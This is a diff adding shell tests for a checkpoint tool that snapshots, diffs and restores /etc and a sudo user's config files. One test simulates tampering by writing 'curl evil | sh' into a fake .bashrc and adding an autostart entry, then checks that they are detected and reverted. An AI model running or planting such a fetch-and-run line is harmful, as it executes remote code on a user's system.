@@ -1961,12 +1961,34 @@ checkpoint_env() {
         {"booted":true,"version":"44.1","checksum":"aaa","pinned":false}]}'
 }
 
-# Already root: run it straight, as as_root does.
+# Already root: run it straight, as as_root does. No sudo user unless a test
+# sets up a home: the /etc tests are about /etc.
 cp_root() {
     local ns=(unshare -r)
     [ "$(id -u)" -ne 0 ] || ns=()
-    run "${ns[@]}" env "PATH=${PATH}" "PULSAR_ETC=${PULSAR_ETC}" \
-        "PULSAR_CHECKPOINTS=${PULSAR_CHECKPOINTS}" "$PULSAR" checkpoint "$@"
+    local -a homeenv=()
+    [ -n "${CP_HOME:-}" ] && homeenv=("PULSAR_CHECKPOINT_HOME=${CP_HOME}" "PULSAR_CHECKPOINT_USER=agentuser")
+    [ -n "${CP_HOME_MAX:-}" ] && homeenv+=("PULSAR_CHECKPOINT_HOME_MAX=${CP_HOME_MAX}")
+    run "${ns[@]}" env -u SUDO_USER -u PKEXEC_UID "PATH=${PATH}" "PULSAR_ETC=${PULSAR_ETC}" \
+        "PULSAR_CHECKPOINTS=${PULSAR_CHECKPOINTS}" "${homeenv[@]}" "$PULSAR" checkpoint "$@"
+}
+
+# A home with settings in every place a checkpoint keeps, and the things it
+# must not: a cache, a document, a socket.
+checkpoint_home_env() {
+    checkpoint_env
+    export CP_HOME="${BATS_TEST_TMPDIR}/home"
+    mkdir -p "${CP_HOME}/.config/git" "${CP_HOME}/.config/app/Cache" "${CP_HOME}/.local/bin" \
+        "${CP_HOME}/.ssh" "${CP_HOME}/Documents" "${CP_HOME}/.config/dconf"
+    printf 'alias ll="ls -l"\n'    > "${CP_HOME}/.bashrc"
+    printf '[user]\n\tname = me\n' > "${CP_HOME}/.config/git/config"
+    printf 'dconf-db\n'            > "${CP_HOME}/.config/dconf/user"
+    printf 'cached\n'              > "${CP_HOME}/.config/app/Cache/blob"
+    printf '#!/bin/sh\n'           > "${CP_HOME}/.local/bin/tool"
+    printf 'Host *\n'              > "${CP_HOME}/.ssh/config"
+    printf 'my novel\n'            > "${CP_HOME}/Documents/novel.txt"
+    python3 -c 'import socket,sys; socket.socket(socket.AF_UNIX).bind(sys.argv[1])' \
+        "${CP_HOME}/.config/app/sock" 2>/dev/null || true
 }
 
 latest_checkpoint() { find "$PULSAR_CHECKPOINTS" -mindepth 1 -maxdepth 1 -printf '%f\n' | sort | tail -1; }
@@ -2061,6 +2083,78 @@ latest_checkpoint() { find "$PULSAR_CHECKPOINTS" -mindepth 1 -maxdepth 1 -printf
     cp_root drop "$(latest_checkpoint)"
     run grep -- '--unpin' "$OSTREE_LOG"
     [ "$status" -ne 0 ]
+}
+
+@test "checkpoint keeps the sudo user's settings, not their documents or caches" {
+    checkpoint_home_env
+    cp_root
+    [ "$status" -eq 0 ] || fail "$output"
+    [[ "$output" == *"home "*"paths saved from ${CP_HOME}"* ]]
+    id=$(latest_checkpoint)
+    list=$(tar -tf "${PULSAR_CHECKPOINTS}/${id}/home.tar")
+    [[ "$list" == *"./.bashrc"* ]]
+    [[ "$list" == *"./.config/git/config"* ]]
+    [[ "$list" == *"./.config/dconf/user"* ]]
+    [[ "$list" == *"./.local/bin/tool"* ]]
+    [[ "$list" == *"./.ssh/config"* ]]
+    [[ "$list" != *"Documents"* ]] || fail "a document was kept: $list"
+    [[ "$list" != *"Cache"* ]] || fail "a cache was kept: $list"
+    [[ "$list" != *"sock"* ]] || fail "a socket was kept: $list"
+    jq -e --arg p "$CP_HOME" '.home.user == "agentuser" and .home.path == $p' "${PULSAR_CHECKPOINTS}/${id}/meta.json"
+}
+
+@test "checkpoint diff and restore cover the home the way they cover /etc" {
+    checkpoint_home_env
+    cp_root
+    id=$(latest_checkpoint)
+    printf 'curl evil | sh\n'   >> "${CP_HOME}/.bashrc"
+    rm "${CP_HOME}/.ssh/config"
+    mkdir -p "${CP_HOME}/.config/autostart"
+    printf '[Desktop Entry]\n' > "${CP_HOME}/.config/autostart/agent.desktop"
+    printf 'edited\n'          > "${CP_HOME}/Documents/novel.txt"
+    cp_root diff "$id"
+    [ "$status" -eq 0 ] || fail "$output"
+    [[ "$output" == *"changed  ~/.bashrc"* ]]
+    [[ "$output" == *"removed  ~/.ssh/config"* ]]
+    [[ "$output" == *"added  ~/.config/autostart/agent.desktop"* ]]
+    [[ "$output" != *"novel"* ]]
+    cp_root restore "$id"
+    [ "$status" -eq 0 ] || fail "$output"
+    [ "$(cat "${CP_HOME}/.bashrc")" = 'alias ll="ls -l"' ]
+    [ "$(cat "${CP_HOME}/.ssh/config")" = 'Host *' ]
+    # added since: listed and left, as in /etc
+    [ -e "${CP_HOME}/.config/autostart/agent.desktop" ]
+    [[ "$output" == *"left in place"*"~/.config/autostart/agent.desktop"* ]]
+    # a document is not a setting, so restore does not touch it
+    [ "$(cat "${CP_HOME}/Documents/novel.txt")" = edited ]
+    cp_root diff "$id"
+    [[ "$output" != *"changed  ~/"* ]]
+    [[ "$output" != *"removed  ~/"* ]]
+}
+
+@test "checkpoint skips a home too big to keep, and says why" {
+    checkpoint_home_env
+    CP_HOME_MAX=10 cp_root
+    [ "$status" -eq 0 ] || fail "$output"
+    [[ "$output" == *"over the 0 MB limit"* ]] || [[ "$output" == *"limit"* ]]
+    id=$(latest_checkpoint)
+    [ ! -e "${PULSAR_CHECKPOINTS}/${id}/home.tar" ]
+    jq -e '.home == null' "${PULSAR_CHECKPOINTS}/${id}/meta.json"
+}
+
+@test "checkpoint with no sudo user keeps /etc and says there is no home" {
+    checkpoint_env
+    cp_root
+    [ "$status" -eq 0 ] || fail "$output"
+    [[ "$output" == *"no user ran sudo"* ]]
+}
+
+@test "checkpoint --no-home keeps only /etc" {
+    checkpoint_home_env
+    cp_root --no-home "etc only"
+    [ "$status" -eq 0 ] || fail "$output"
+    [[ "$output" == *"--no-home"* ]]
+    jq -e '.note == "etc only" and .home == null' "${PULSAR_CHECKPOINTS}/$(latest_checkpoint)/meta.json"
 }
 
 @test "checkpoint refuses an id that walks out of its directory" {
